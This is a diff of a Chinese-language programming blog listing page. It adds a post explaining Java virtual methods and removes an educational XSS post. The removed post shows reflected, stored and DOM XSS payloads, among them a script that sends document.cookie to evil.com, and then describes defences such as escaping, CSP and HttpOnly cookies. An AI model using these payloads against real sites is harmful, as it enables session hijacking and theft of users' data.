@@ -69,6 +69,66 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Java-virtual-method" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/note/2025/05/17/Java-virtual-method/" class="article-date">
+  <time class="dt-published" datetime="2025-05-17T05:51:56.000Z" itemprop="datePublished">2025-05-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/note/2025/05/17/Java-virtual-method/">Java virtual method</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>在 Java 中，虛擬方法（Virtual Method）是指在執行階段會根據「實際物件的類型」來動態決定要執行哪個方法實作的機制。</p>
+<p>這是物件導向程式設計中實現多型（polymorphism）的核心功能之一。</p>
+<h2 id="Java-的虛擬方法定義"><a href="#Java-的虛擬方法定義" class="headerlink" title="Java 的虛擬方法定義"></a>Java 的虛擬方法定義</h2><p>在 Java 中，<strong>除了 <code>static</code>、<code>private</code> 和 <code>final</code> 方法之外，所有的方法預設都是虛擬方法</strong>。也就是說，大多數的實例方法都會在執行時被動態繫結（dynamic dispatch）。</p>
+<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
+<li>使用父類別參考指向子類別物件時，呼叫的方法會依照「實際物件的類型」決定。</li>
+<li>呼叫的決策發生在執行階段，而不是編譯階段。</li>
+<li>支援 override：子類別可以覆寫父類別的方法實作。</li>
+</ul>
+<h2 id="範例程式碼"><a href="#範例程式碼" class="headerlink" title="範例程式碼"></a>範例程式碼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">speak</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal speaks&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">speak</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog barks&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();  <span class="comment">// 父類別參考指向 Dog 實體</span></span><br><span class="line">        a.speak();             <span class="comment">// 輸出：Dog barks</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>雖然變數 a 是 Animal 型別，但實際物件是 Dog，因此呼叫的是 Dog 類別中的 speak 方法。這就是虛擬方法的行為。</p>
+<h2 id="非虛擬方法（Non-Virtual-Method）"><a href="#非虛擬方法（Non-Virtual-Method）" class="headerlink" title="非虛擬方法（Non-Virtual Method）"></a>非虛擬方法（Non-Virtual Method）</h2><p>以下幾種方法不是虛擬方法，因為它們不支援 override 或不會被動態繫結：</p>
+<ul>
+<li>static 方法：屬於類別本身</li>
+<li>private 方法：僅能在定義該方法的類別中使用</li>
+<li>final 方法：不允許被子類別覆寫</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">privateMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal private&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">finalMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal final&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>Java 中的虛擬方法機制是實現多型的關鍵。除非方法被聲明為 <code>static</code>、<code>final</code> 或 <code>private</code>，否則它預設就是虛擬的，會依照執行時的實際物件決定呼叫的版本。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://z6wdc.github.io/note/2025/05/17/Java-virtual-method/" data-id="cmeviocaa000onr8p1q095sii" data-title="Java virtual method" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/note/tags/Java/" rel="tag">Java</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-go-table-driven-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/note/2025/05/17/go-table-driven-test/" class="article-date">
@@ -129,7 +189,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/05/17/go-table-driven-test/" data-id="cmdb95d35004mn99b13jdgd92" data-title="go table-driven test" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/05/17/go-table-driven-test/" data-id="cmeviocbm004mnr8p01cg1z0m" data-title="go table-driven test" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -213,7 +273,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/05/08/avro-overview-and-examples/" data-id="cmdb95d2u003jn99b2kh554ui" data-title="avro overview and examples" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/05/08/avro-overview-and-examples/" data-id="cmeviocbc003jnr8pfrqg6nkg" data-title="avro overview and examples" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -325,7 +385,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/05/05/gitmessage-guide/" data-id="cmdb95d32004dn99bgnd48xy7" data-title="gitmessage guide" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/05/05/gitmessage-guide/" data-id="cmeviocbk004dnr8phsss89u8" data-title="gitmessage guide" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -409,7 +469,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/05/02/go-mock/" data-id="cmdb95d34004hn99bg7hd9m7g" data-title="go mock" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/05/02/go-mock/" data-id="cmeviocbl004hnr8p4xo581h8" data-title="go mock" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -529,7 +589,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/26/Go-Module/" data-id="cmdb95d1s000en99b045663wg" data-title="Go Module" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/26/Go-Module/" data-id="cmevioca5000enr8pbxmb61b4" data-title="Go Module" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -654,7 +714,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/26/go-install-vs-go-get/" data-id="cmdb95d33004fn99balte31wk" data-title="go install vs go get" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/26/go-install-vs-go-get/" data-id="cmeviocbl004fnr8pbiwsael1" data-title="go install vs go get" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -792,7 +852,7 @@ flowchart TD
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/05/Go-install/" data-id="cmdb95d1t000gn99barqtexuc" data-title="Go install" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/05/Go-install/" data-id="cmevioca7000gnr8p7h0geaqs" data-title="Go install" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -840,7 +900,7 @@ flowchart TD
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/04/first-class-object/" data-id="cmdb95d2x003wn99bfuab54ym" data-title="first class object" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/04/first-class-object/" data-id="cmeviocbf003wnr8phol7edik" data-title="first class object" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -931,105 +991,7 @@ flowchart TD
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/02/CAP-Theorem/" data-id="cmdb95d1m0005n99bdv61fxo5" data-title="CAP Theorem" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/note/2025/03/26/XSS/" class="article-date">
-  <time class="dt-published" datetime="2025-03-26T16:13:01.000Z" itemprop="datePublished">2025-03-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/note/2025/03/26/XSS/">XSS</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>XSS（Cross-Site Scripting，跨站腳本攻擊）是一種 Web 安全漏洞，攻擊者透過在網站中注入惡意 JavaScript，使該腳本在其他使用者的瀏覽器中執行，從而竊取用戶資訊、控制瀏覽行為或進一步發動攻擊。</p>
-<hr>
-<h2 id="XSS-的攻擊類型"><a href="#XSS-的攻擊類型" class="headerlink" title="XSS 的攻擊類型"></a><strong>XSS 的攻擊類型</strong></h2><h3 id="1-反射型-XSS（Reflected-XSS）"><a href="#1-反射型-XSS（Reflected-XSS）" class="headerlink" title="1. 反射型 XSS（Reflected XSS）"></a><strong>1. 反射型 XSS（Reflected XSS）</strong></h3><p>攻擊者將惡意腳本放入 <strong>URL 參數或表單輸入</strong>，當受害者點擊惡意連結或提交表單時，惡意 JavaScript 會被伺服器回應並在瀏覽器中執行。</p>
-<h4 id="範例"><a href="#範例" class="headerlink" title="範例"></a><strong>範例</strong></h4><p>假設某個網站接受 <code>query</code> 參數並直接顯示在頁面上：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>搜尋結果：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="built_in">decodeURIComponent</span>(location.<span class="property">search</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>如果攻擊者讓受害者點擊：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/search?query=&lt;script&gt;alert(&#x27;你被 XSS 攻擊了!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>那麼當受害者訪問該 URL，瀏覽器會執行 <code>alert(&#39;你被 XSS 攻擊了!&#39;)</code>，攻擊成功。</p>
-<hr>
-<h3 id="2-儲存型-XSS（Stored-XSS）"><a href="#2-儲存型-XSS（Stored-XSS）" class="headerlink" title="2. 儲存型 XSS（Stored XSS）"></a><strong>2. 儲存型 XSS（Stored XSS）</strong></h3><p>攻擊者將惡意腳本 <strong>儲存在伺服器上</strong>（如留言板、聊天室、論壇），其他使用者造訪該頁面時，惡意腳本會自動執行。</p>
-<h4 id="範例-1"><a href="#範例-1" class="headerlink" title="範例"></a><strong>範例</strong></h4><p>攻擊者在留言區發送：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://evil.com/steal?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>當其他使用者查看這條留言時，瀏覽器會執行該 JavaScript，並將用戶的 Cookie 傳送給攻擊者，導致帳號被盜。</p>
-<hr>
-<h3 id="3-DOM-型-XSS（DOM-Based-XSS）"><a href="#3-DOM-型-XSS（DOM-Based-XSS）" class="headerlink" title="3. DOM 型 XSS（DOM-Based XSS）"></a><strong>3. DOM 型 XSS（DOM-Based XSS）</strong></h3><p>攻擊者利用 JavaScript 操作網頁 DOM，改變頁面內容並執行惡意腳本，通常不經過伺服器處理。</p>
-<h4 id="範例-2"><a href="#範例-2" class="headerlink" title="範例"></a><strong>範例</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> input = location.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>); <span class="comment">// 取得 URL 的 hash 值</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;output&#x27;</span>).<span class="property">innerHTML</span> = input;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>當用戶訪問：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/#&lt;script&gt;alert(&#x27;XSS!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>瀏覽器會直接執行 <code>alert(&#39;XSS!&#39;)</code>，攻擊成功。</p>
-<hr>
-<h2 id="XSS-的風險"><a href="#XSS-的風險" class="headerlink" title="XSS 的風險"></a><strong>XSS 的風險</strong></h2><ul>
-<li><strong>竊取使用者 Cookie，冒充身份（Session Hijacking）</strong></li>
-<li><strong>記錄按鍵、竊取密碼</strong></li>
-<li><strong>進行釣魚攻擊，顯示偽造的登入頁面</strong></li>
-<li><strong>發送惡意請求，影響網站功能</strong></li>
-<li><strong>植入後門，長期監控受害者</strong></li>
-</ul>
-<hr>
-<h2 id="如何防禦-XSS"><a href="#如何防禦-XSS" class="headerlink" title="如何防禦 XSS"></a><strong>如何防禦 XSS</strong></h2><h3 id="1-輸入驗證與過濾"><a href="#1-輸入驗證與過濾" class="headerlink" title="1. 輸入驗證與過濾"></a><strong>1. 輸入驗證與過濾</strong></h3><ul>
-<li>移除 <code>&lt;script&gt;</code>、<code>onerror</code>、<code>javascript:</code> 這類惡意標籤或屬性。</li>
-<li>限制允許的 HTML 標籤，例如使用 <strong>HTML Purifier</strong>（PHP）或 <strong>DOMPurify</strong>（JavaScript）。</li>
-</ul>
-<h3 id="2-輸出時進行-HTML-Escape"><a href="#2-輸出時進行-HTML-Escape" class="headerlink" title="2. 輸出時進行 HTML Escape"></a><strong>2. 輸出時進行 HTML Escape</strong></h3><ul>
-<li><strong>永遠不要直接插入用戶輸入</strong>，應對 HTML 內容進行編碼：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>使用者輸入：<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>在後端（Python Flask）：<code>escape(user_input)</code></li>
-<li>在前端（JavaScript）：<code>.textContent = user_input</code></li>
-</ul>
-</li>
-</ul>
-<h3 id="3-使用-CSP（Content-Security-Policy）"><a href="#3-使用-CSP（Content-Security-Policy）" class="headerlink" title="3. 使用 CSP（Content Security Policy）"></a><strong>3. 使用 CSP（Content Security Policy）</strong></h3><ul>
-<li>禁止內嵌腳本，防止 XSS 攻擊：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="4-使用-HttpOnly-Cookie"><a href="#4-使用-HttpOnly-Cookie" class="headerlink" title="4. 使用 HttpOnly Cookie"></a><strong>4. 使用 HttpOnly Cookie</strong></h3><ul>
-<li>防止 JavaScript 讀取 Cookie，降低 Session 被竊取的風險：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session_id=abc123; HttpOnly; Secure</span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a><strong>結論</strong></h2><p>XSS 是一種透過注入惡意 JavaScript 來攻擊網站的漏洞，常見類型包括：</p>
-<ol>
-<li><strong>反射型 XSS</strong>（需要誘導受害者點擊惡意連結）。</li>
-<li><strong>儲存型 XSS</strong>（惡意腳本存儲在伺服器上，自動影響所有使用者）。</li>
-<li><strong>DOM 型 XSS</strong>（透過 JavaScript 操作 DOM 來執行攻擊）。</li>
-</ol>
-<p>有效的防禦措施包括：</p>
-<ul>
-<li><strong>輸入過濾</strong>（防止惡意代碼進入系統）。</li>
-<li><strong>輸出編碼</strong>（避免 JavaScript 被直接執行）。</li>
-<li><strong>CSP 安全策略</strong>（防止不受信任的腳本執行）。</li>
-<li><strong>HttpOnly Cookie</strong>（防止 JavaScript 竊取 Session）。</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/03/26/XSS/" data-id="cmdb95d2u003hn99b60mz9xai" data-title="XSS" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/02/CAP-Theorem/" data-id="cmevioc9z0005nr8p7ocf7fzz" data-title="CAP Theorem" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1045,7 +1007,7 @@ flowchart TD
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/note/">&laquo; Prev</a><a class="page-number" href="/note/">1</a><span class="page-number current">2</span><a class="page-number" href="/note/page/3/">3</a><a class="page-number" href="/note/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/note/page/12/">12</a><a class="extend next" rel="next" href="/note/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/note/">&laquo; Prev</a><a class="page-number" href="/note/">1</a><span class="page-number current">2</span><a class="page-number" href="/note/page/3/">3</a><a class="page-number" href="/note/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/note/page/13/">13</a><a class="extend next" rel="next" href="/note/page/3/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -1078,7 +1040,7 @@ flowchart TD
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/07/">July 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/06/">June 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/04/">April 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/03/">March 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2022/10/">October 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/05/">May 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/07/">July 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/06/">June 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/04/">April 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/03/">March 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2022/10/">October 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/note/archives/2021/05/">May 2021</a></li></ul>
     </div>
   </div>
 
@@ -1089,6 +1051,10 @@ flowchart TD
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/note/2025/08/28/go-variable-declaration/">Go variable declaration</a>
+          </li>
         
           <li>
             <a href="/note/2025/07/19/Bidirectional-Map/">雙向 Hash Map</a>
@@ -1104,10 +1070,6 @@ flowchart TD
         
           <li>
             <a href="/note/2025/07/17/go-string-byte-rune/">Go 語言中的 string、byte、rune 與 UTF-8 編碼關係整理</a>
-          </li>
-        
-          <li>
-            <a href="/note/2025/07/17/go-type-casting/">Go 型別轉換</a>
           </li>
         
       </ul>
